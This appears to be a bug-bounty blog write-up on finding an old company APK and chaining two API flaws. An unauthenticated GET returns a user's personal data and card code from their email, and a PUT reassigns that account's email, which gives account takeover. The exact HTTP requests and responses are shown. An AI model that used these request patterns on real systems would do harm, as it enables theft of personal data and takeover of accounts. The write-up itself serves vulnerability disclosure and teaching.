---
description: How I found a critical bug in API...
title: API Misconfiguration lead to Full ATO
date: 2024-04-02 08:00:00 -0600                           # Change the date to match completion date
categories: [WebHacking]                   # Change Templates to Writeup
tags: [bugbouny, redacted, webhacking, hacking]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image:                # Add infocard image here for post preview image
---

Hey ! Today I’m going to share with you an amazing found I made on a big company chaining multiple bugs and misconfigurations on their API :)

## Let's go !

![enter image description here](https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExMGgxdmJpdTBiMHlxbnFtcW1pbzF1ajVwNWx2dWUzbGtyOGhqaDVrciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/CjmvTCZf2U3p09Cn0h/giphy.gif)

First of all, when I recon a target, I like looking for lost apks on obscure websites on the internet

So I went to my favorite apk websites :  [https://apkcombo.com](https://apkcombo.com),  [https://apkmonk.com](https://apkmonk.com)  and  [https://apkpure.com](https://apkpure.com)

![enter image description here](https://apkpure.net/static/imgs/website_screen_v1.jpg)


After some research, I found an interesting APK :  myapp.redacted last updated on 2016

So I downloaded the APK, launched Nox and BurpSuite and started hacking

![enter image description here](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExbW5qdGg4cG9hcGxubWc2dDdsMGdsaWlmbmF5ZTNsOHRmcWFkcnp0ciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/YQitE4YNQNahy/giphy.gif)

## Browsing the APK

I browsed through the APK for about ten minutes and it literally seemed broken. It used the api “http://appli.redacted.com"

Using BurpSuite Mapping, I found a very interesting endpoint: /fr/v2.0/Clients/%2520/ 👀👀

And after a few tries, I understood that I had to add the user’s email, so I made the request :

    GET /fr/v2.0/Clients/%2520/victim@gmail.com HTTP/1.1 
    Host: appli.redacted.com 
    Connection: close 
    Accept-Encoding: gzip, deflate 
    User-Agent: okhttp/3.12.1

And I got the following response :

    HTTP/1.1 200 OK 
    Server: Apache X-Powered-By: PHP/5.4.45-0+deb7u14 
    Cache-Control: no-cache, must-revalidate 
    Expires: Mon, 26 Jul 1997 05:00:00 GMT 
    Content-Length: 595 
    Connection: close 
    Content-Type: application/json 
    
    [{"code":"8000040264945","lat":0,"long":0,"nom":"Sakayanagi","pays":"FR","code_postal":"86100","prenom":"Arisu","email":"victim@gmail.com","newsletter":1,"date_creation":"2023-11-20T17:22:20","mobile":"0689123912","statut":true,"type":"1","secteur":"","raison_sociale":"","code_ape":"","mag_prefere":"0000001525","code_identite":"","kbis":"","date_kbis":"","devices":[{"uuid":"46C61A4B-D390-5BBD-8C20-BF2702327716","token":"254EF7C844BF25B845D7B1D49DD22753407AC6D989028B589931935FC2D352CB","actif":"1","alerte_promo":"1","alerte_cata":"1","alerte_mag":"1","tracking_id":"","android":"0"}]}]

**FIRST BUG : PII Leakage via API Misconfiguration**

![enter image description here](https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHdneHJzZHprZWZxaXdsaXo0OTNjODczdXh6ZW01cWxjcmxmcWpvMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/kdQuvu0LtCEjxYgTcS/giphy.gif)

## No done yet... !

So from that moment I decided to go down the rabbit hole to find other vulnerabilities

And after some research I found another endpoint that used a PUT method :

    PUT /fr/v2.0/Clients/8000040264945 HTTP/1.1 
    Content-Type: application/x-www-form-urlencoded 
    Content-Length: 401 
    Host: appli.redacted.com 
    Connection: close 
    Accept-Encoding: gzip, deflate 
    User-Agent: okhttp/3.12.1 
    
    type=1&email=victim@gmail.com&device=e91480e2a8eb83af&android=1&nom=&prenom=&cp=86100&mobile=&pays=&token=dZJKFETVSRWwzz4olPqvF0%3AAPA91bEZA4Mvt5AttKlMRzfQ70nT-Hv7BHBlwix8WI9taP91n-_XEnMHnegOVQfNn0No6XDEuvPn_-rP7MufTLLta3ZilKYVjP0-rp9X_krK0yTLTgbasPYSP5s9kQKkG_PCntlQmkma&code_identite=&mag_prefere=0000001525&newsletter=1&alerte_mag=1&alerte_cata=1&alerte_promo=1&lat=&long=

This request was logged when I tried to modify my VIP card details on the APK (8000040264945)

BUTTT, and this is the whole point of this chaining, I could obtain the VIP card code of any user from their email with the previous request. I think you understand where I’m going with this… 😈

I quickly created another account on the platform, I retrieved my VIP code with the first request then in the second request I replaced my email address with  [attacker@gmail.com](mailto:attacker@gmail.com)

And I got the following response :

    HTTP/1.1 200 OK 
    Server: Apache 
    X-Powered-By: PHP/5.4.45-0+deb7u14 
    Cache-Control: no-cache, must-revalidate 
    Expires: Mon, 26 Jul 1997 05:00:00 GMT 
    Content-Length: 582 
    Connection: close 
    Content-Type: application/json 
    
    [{"code":"8000040264956","lat":0,"long":0,"nom":"DUJARDIN","pays":"FR","code_postal":"75002","prenom":"Victim","email":"attacker@gmail.com","newsletter":1,"date_creation":"2023-12-10T10:26:27","mobile":"+33655421789","statut":"actif","type":"1","secteur":"","raison_sociale":"","code_ape":"","mag_prefere":"","code_identite":"","kbis":"","date_kbis":"","devices":[{"uuid":"46B61A3B-D390-4CCD-8C20-BF2701317816","token":"254EF7C844BF78B845D7B1D09DD22753407AC6D459028B578731935FC2D352BB","actif":"1","alerte_promo":"1","alerte_cata":"1","alerte_mag":"1","tracking_id":"","android":"0"}]}]

![enter image description here](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExdDI2ZXQ0ZGM5eWRpOWJnaWxtcThmajI0ZWh1cGRpdm5nOHpmN3F3OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/oYtVHSxngR3lC/giphy.gif)


## Achieve Full 0-click ATO

After that, I created an account on the platform with  [attacker@gmail.com](mailto:attacker@gmail.com), I checked my email and when I connected I came across my previous account (the one I replaced email with the PUT request) !! 🎉🎉

And that’s the end of the story on how my extroardinary chaining allowed me to achieve an account takeover.

## Tips

1 - Always look for APKs belong to the company
2 - Privilegate old/lost APKs
